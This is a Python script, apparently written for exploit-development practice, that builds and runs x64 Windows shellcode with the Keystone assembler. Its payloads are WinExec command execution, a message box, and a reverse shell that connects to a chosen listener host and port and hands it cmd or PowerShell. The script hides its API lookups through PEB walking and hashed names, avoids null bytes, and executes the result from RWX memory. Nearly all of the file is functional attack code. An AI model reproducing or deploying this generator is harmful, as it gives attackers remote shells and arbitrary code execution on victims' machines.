import ctypes, struct, numpy, argparse
from keystone import *
import sys

parser = argparse.ArgumentParser(description='Shellcode Practice x64')
parser.add_argument('-t','--type', type=str.lower, help='Shellcode Type', choices=['winexec','msgbox','revshell'], required=True)
parser.add_argument('-c','--command', help='For winexec, command to run', required=False)
parser.add_argument('-s','--string', help='For msgbox, string to show', required=False)
parser.add_argument('-lh','--lhost', help='For revshell, listener host', required=False)
parser.add_argument('-lp','--lport', help='For revshell, listener port', type=int, required=False)
parser.add_argument('-sh','--shell', help='For revshell, shell type', choices=['cmd','pwsh'], default='cmd', required=False)
args = parser.parse_args()

def to_hex(s):
    retval = list()
    for char in s:
        retval.append(hex(ord(char)).replace("0x", ""))
    return "".join(retval)

def push_string(input_string):
    input_bytes = input_string.encode('utf-8')
    chunks = [struct.unpack('<Q', input_bytes[i:i+8] + b'\x00'*(8-len(input_bytes[i:i+8])))[0]
              for i in range(0, len(input_bytes), 8)]
    instructions = ["xor rax, rax;", "push rax;"]
    for chunk in reversed(chunks):
        chunk = hex(chunk).replace('0x','')
        if len(chunk) < 16:
            chunk = ("20" * int(8 - (len(chunk) / 2))) + chunk
        instructions.append(f"mov rax, 0x{chunk};")
        instructions.append("push rax;")

    asm_instructions = "".join(instructions)
    return asm_instructions

def get_port(port):
	port_hex_str = format(port, '04x')
	port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
	if "00" in {port_part_1, port_part_2}:
		port += 257
		port_hex_str = format(port, '04x')
		port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
		return f"mov dx, 0x{port_part_1 + port_part_2};\nsub dx, 0x101;"
	return f"mov dx, 0x{port_part_1 + port_part_2};"

def get_ip(ip):
	ip_hex_parts = [format(int(part), '02x') for part in ip.split('.')]
	reversed_hex = ''.join(ip_hex_parts[::-1])
	if "00" in ip_hex_parts and "ff" not in ip_hex_parts:
		hex_int = int(reversed_hex, 16)
		neg_hex = (0xFFFFFFFF + 1 - hex_int) & 0xFFFFFFFF
		return f"mov edx, 0x{neg_hex:08x};\nneg rdx;"
	return f"mov edx, 0x{reversed_hex};"

def get_shell(shell_type):
	if shell_type == "cmd":
		return f"mov rdx, 0xff9a879ad19b929c;\nnot rdx;"
	else:
          return (f"sub rsp, 8; mov rdx, 0xffff9a879ad19393; not rdx; push rdx; mov rdx, 0x6568737265776f70;")

def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return (int(binb, 2))

def push_function_hash(function_name):
    s = 0x00
    ror_count = 0
    for c in function_name:
        s = s + ord(c)
        if ror_count < len(function_name)-1:
            s = ror_str(s, 0xd)
        ror_count += 1
    return (" mov r8d, %s ;" % hex(s))

def load_module(dll,api):
    CODE = (
        "find_kernel32:"
	    " xor rdx, rdx;"
        " mov rax, gs:[rdx+0x60];"                  # RAX stores  the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
        " mov rsi,[rax+0x18];"                      # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
        " mov rsi,[rsi + 0x20];"                    # RSI is the address of the InMemoryOrderModuleList member in the _PEB_LDR_DATA structure
        " mov r9, [rsi];"                           # Current module is python.exe
        " mov r9, [r9];"                            # Current module is ntdll.dll
        " mov r9, [r9+0x20];"                       # Current module is kernel32.dll
        " jmp resolve_symbols_kernel32;"

        "parse_module:"                             # Parsing DLL file in memory
        " mov ecx, dword ptr [r9 + 0x3c];"          # R9 stores the base address of the dll module, get the NT header offset
        " xor r15, r15;"
        " mov r15b, 0x88;"                          # Offset to Export Directory
        " add r15, r9;"
        " add r15, rcx;"
        " mov r15d, dword ptr [r15];"               # Get the RVA of the export directory
        " add r15, r9;"                             # R14 stores  the VMA of the export directory
        " mov ecx, dword ptr [r15 + 0x18];"         # ECX stores  the number of function names as an index value
        " mov r14d, dword ptr [r15 + 0x20];"        # Get the RVA of ENPT
        " add r14, r9;"                             # R14 stores  the VMA of ENPT

        "search_function:"                          # Search for a given function
        " jrcxz not_found;"                         # If RCX is 0, the given function is not found
        " dec ecx;"                                 # Decrease index by 1
        " xor rsi, rsi;"
        " mov esi, [r14 + rcx*4];"                  # RVA of function name string
        " add rsi, r9;"                             # RSI points to function name string

        "function_hashing:"                         # Hash function name function
        " xor rax, rax;"
        " xor rdx, rdx;"
        " cld;"                                     # Clear DF flag

        "iteration:"                                # Iterate over each byte
        " lodsb;"                                   # Copy the next byte of RSI to Al
        " test al, al;"                             # If reaching the end of the string
        " jz compare_hash;"                         # Compare hash
        " ror edx, 0x0d;"                           # Part of hash algorithm
        " add edx, eax;"                            # Part of hash algorithm
        " jmp iteration;"                           # Next byte

        "compare_hash:"                             # Compare hash
        " cmp edx, r8d;"
        " jnz search_function;"                     # If not equal, search the previous function (index decreases)
        " mov r10d, [r15 + 0x24];"                  # Ordinal table RVA
        " add r10, r9;"                             # Ordinal table VMA
        " movzx ecx, word ptr [r10 + 2*rcx];"       # Ordinal value -1
        " mov r11d, [r15 + 0x1c];"                  # RVA of EAT
        " add r11, r9;"                             # VMA of EAT
        " mov eax, [r11 + 4*rcx];"                  # RAX stores  RVA of the function
        " add rax, r9;"                             # RAX stores  VMA of the function
        " ret;"
        "not_found:"
        " ret;"

        "resolve_symbols_kernel32:"
        " mov rbx, rsp;"
        " sub rbx, 0xffffffffffffff10;"
        f"{push_function_hash('LoadLibraryA')}"         # LoadLibraryA hash
        " call parse_module;"                           # Call parse_module
        " mov qword ptr [rbx], rax;"                    # Save LoadLibraryA address for later
        f"{push_function_hash('TerminateProcess')}"     # TerminateProcess Hash
        " call parse_module;"                           # Call parse_module
        " mov qword ptr [rbx+0x8], rax;"                # Save TerminateProcess address for later

    ) + (f"{push_function_hash('CreateProcessA')} call parse_module; mov qword ptr [rbx+0x18], rax;" if args.type == 'revshell' else "") + (

        "load_module:"
        " xor rcx, rcx;"
        " push rcx;"
        f"{push_string(dll)}"
        " mov rcx, rsp;"
        " sub rsp, 0x20;"
        " call qword ptr [rbx];"
        " add rsp, 0x20;"
        " mov r9, rax;"
    
        "resolve_symbols_loaded:"
        f"{push_function_hash(api)};"               # API Hash        
        " call parse_module;"                       # Call parse_module
        " mov qword ptr [rbx+0x10], rax;"
    )
    return CODE

def win_exec():
    CODE = load_module('kernel32.dll','WinExec')  + (

        "exec_api:"
        " xor rcx, rcx;"
        " push rcx;"
        f"{push_string('cmd.exe /c ' + args.command)}"
        " mov rcx, rsp;"                 # Address of the string as the 1st argument lpCmdLine
        " xor rdx, rdx;"    
        " inc rdx;"                      # uCmdShow=1 as the 2nd argument
        " sub rsp, 0x40;"                # Function prologue
        " call qword ptr [rbx+0x10];"    # WinExec
        " add rsp, 0x40;"                # Function prologue
    
        "call_terminateproc:"   
        " xor rcx, rcx;"    
        " sub rsp, 0x60;"                # Function prologue
		" call qword ptr [rbx+0x8];"     # TerminateProcess
        " add rsp, 0x60;"                # Function prologue
    )
    return CODE

def msg_box():
    CODE = load_module('user32.dll','MessageBoxA') + (

        "exec_api:"
        " xor rcx, rcx;"
        " push rcx;"
        f'{push_string(args.string)}'
        " mov rdx, rsp;"                        # Address of the string as the 1st argument lpText
        f'{push_string(args.string)}'
        " mov r8, rsp;"                         # Address of the string as the 1st argument lpCaption
        " xor r9, r9;"                          # uType
        " inc r9;"
        " sub rsp, 0x40;"                       # Function prologue
        " call qword ptr [rbx+0x10];"           # MessageBoxA
        " add rsp, 0x40;"                       # Function prologue

        "call_terminateproc:"
        " xor rcx, rcx;"
        " sub rsp, 0x60;"                       # Function prologue
		" call qword ptr [rbx+0x8];"            # TerminateProcess
        " add rsp, 0x60;"                       # Function prologue
    )
    return CODE

def rev_shell():
    CODE = load_module('ws2_32.dll','WSAStartup') + (

        "resolve_symbols_extra:"
        f"{push_function_hash('WSASocketA')};"
        " call parse_module;"
        " mov qword ptr [rbx+0x20], rax;"
        f"{push_function_hash('WSAConnect')};"
        " call parse_module;"
        " mov qword ptr [rbx+0x28], rax;"

        "call_wsastartup:"
        " xor rcx, rcx;"
        " mov cx, 0x198;"
        " sub rsp, rcx;"                       # Reserve enough space for the lpWSDATA structure
        " lea rdx, [rsp];"                     # Assign the address of lpWSAData to the RDX register as the 2nd parameter
        " mov cx, 0x202;"                      # Assign 0x202 to wVersionRequired and store it in RCX as the 1st parameter
        " sub rsp, 0x30;"                      # Function prologue
        " call qword ptr [rbx+0x10];"          # Call WSAStartup
        " add rsp, 0x30;"                      # Function epilogue

        "call_wsasocket:"
        " xor rcx, rcx;"
        " mov cl, 2;"                          # AF is 2 as the 1st parameter
        " xor rdx, rdx;"
        " mov dl, 1;"                          # Type is 1 as the 2nd parameter
        " xor r8, r8;"
        " mov r8b, 6;"                         # Protocol is 6 as the 3rd parameter
        " xor r9, r9;"                         # lpProtocolInfo is 0 as the 4th parameter
        " mov [rsp+0x20], r9;"                 # g is 0 as the 5th parameter, stored on the stack
        " mov [rsp+0x28], r9;"                 # dwFlags is 0 as the 6th parameter, stored on the stack
        " call qword ptr [rbx+0x20];"          # Call WSASocketA function
        " mov r12, rax;"                       # Save the returned socket type return value in R12 to prevent data loss in RAX
        " add rsp, 0x30;"                      # Function epilogue

        "call_wsaconnect:"
        " mov rcx, r12;"                       # Pass the socket descriptor returned by WSASocketA to RCX as the 1st parameter
        " xor rdx, rdx;"
        " mov dl, 2;"                          # Set sin_family to AF_INET (=2)
        " mov [rsp], rdx;"                     # Store the socketaddr structure
        " xor rdx, rdx;"
        f"{get_port(args.lport)}"	           # Set local port dynamically
        " mov [rsp+2], rdx;"                   # Pass the port value to the corresponding position in the socketaddr structure
        f"{get_ip(args.lhost)}"
        " mov [rsp+4], rdx;"                   # Pass IP to the corresponding position in the socketaddr structure
        " lea rdx, [rsp];"                     # Pointer to the socketaddr structure as the 2nd parameter
        " xor r8, r8;"
        " mov r8b, 0x16;"                      # Set namelen member to 0x16
        " xor r9, r9;"                         # lpCallerData is 0 as the 4th parameter
        " sub rsp, 0x38;"                      # Function prologue
        " mov [rsp+0x20], r9;"                 # lpCalleeData is 0 as the 5th parameter
        " mov [rsp+0x28], r9;"                 # lpSQOS is 0 as the 6th parameter
        " mov [rsp+0x30], r9;"                 # lpGQOS is 0 as the 7th parameter
        " call qword ptr [rbx+0x28];"          # Call WSAConnect
        " add rsp, 0x38;"                      # Function epilogue

        "call_createprocess:"
        f"{get_shell(args.shell)}"
        " push rdx;"   
        " mov rdx, rsp;"                        # Pointer to "cmd.exe" is stored in the RCX register
        " push r12;"                            # The member STDERROR is the return value of WSASocketA
        " push r12;"                            # The member STDOUTPUT is the return value of WSASocketA
        " push r12;"                            # The member STDINPUT is the return value of WSASocketA
        " xor rcx, rcx;"        
        " push cx;"                             # Pad with 0x00 before pushing the dwFlags member, only the total size matters
        " push rcx;"
        " push rcx;"
        " mov cl, 0xff;"
        " inc cx;"                              # 0xff+1=0x100
        " push cx;"                             # dwFlags=0x100
        " xor rcx, rcx;"
        " push cx;"                             # Pad with 0 before pushing the cb member, only the total size matters
        " push cx;"
        " push rcx;"
        " push rcx;"
        " push rcx;"
        " push rcx;"
        " push rcx;"
        " push rcx;"
        " mov cl, 0x68;"
        " push rcx;"                            # cb=0x68
        " mov rdi, rsp;"                        # Pointer to STARTINFOA structure
        " mov rcx, rsp;"
        " sub rcx, 0x20;"                       # Reserve enough space for the ProcessInformation structure
        " push rcx;"                            # Address of the ProcessInformation structure as the 10th parameter
        " push rdi;"                            # Address of the STARTINFOA structure as the 9th parameter
        " xor rcx, rcx;"
        " push rcx;"                            # Value of lpCurrentDirectory is 0 as the 8th parameter
        " push rcx;"                            # lpEnvironment=0 as the 7th argument
        " push rcx;"                            # dwCreationFlags=0 as the 6th argument
        " inc rcx;"
        " push rcx;"                            # Value of bInheritHandles is 1 as the 5th parameter
        " dec cl;"
        " push rcx;"                            # Reserve space for the function return area (4th parameter)
        " push rcx;"                            # Reserve space for the function return area (3rd parameter)
        " push rcx;"                            # Reserve space for the function return area (2nd parameter)
        " push rcx;"                            # Reserve space for the function return area (1st parameter)
        " mov r8, rcx;"                         # lpProcessAttributes value is 0 as the 3rd parameter
        " mov r9, rcx;"                         # lpThreatAttributes value is 0 as the 4th parameter
        " call qword ptr [rbx+0x18];"           # Call CreateProcessA

        "call_terminateproc:"
        " xor rcx, rcx;"
        " sub rsp, 0x60;"                       # Function prologue
		" call qword ptr [rbx+0x8];"            # TerminateProcess
        " add rsp, 0x60;"                       # Function prologue
    )
    return CODE

ks = Ks(KS_ARCH_X86, KS_MODE_64)
match args.type:
    case 'winexec':
        if args.command:
            encoding, count = ks.asm(win_exec())
        else:
            parser.error('[-] WinExec Requires -c/--command')
    case 'msgbox':
        if args.string:
            encoding, count = ks.asm(msg_box())
        else:
            parser.error('[-] MsgBox Requires -s/--string')
    case 'revshell':
        if (args.lport and args.lhost):
            encoding, count = ks.asm(rev_shell())
        else:
            parser.error('[-] Reverse Shell Requires -lh/--lhost -lp/--lport')

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

sc = ""

counter = 0
sc = ""
for dec in encoding:
    sc += "\\x{0:02x}".format(int(dec))
    counter += 1

print(f'Shellcode: {args.type}')
print(f'Length: {len(encoding)} Bytes')
print(sc[:-1])
input('Press Enter To Execute or Ctrl+C to Quit..')

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(ptr))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))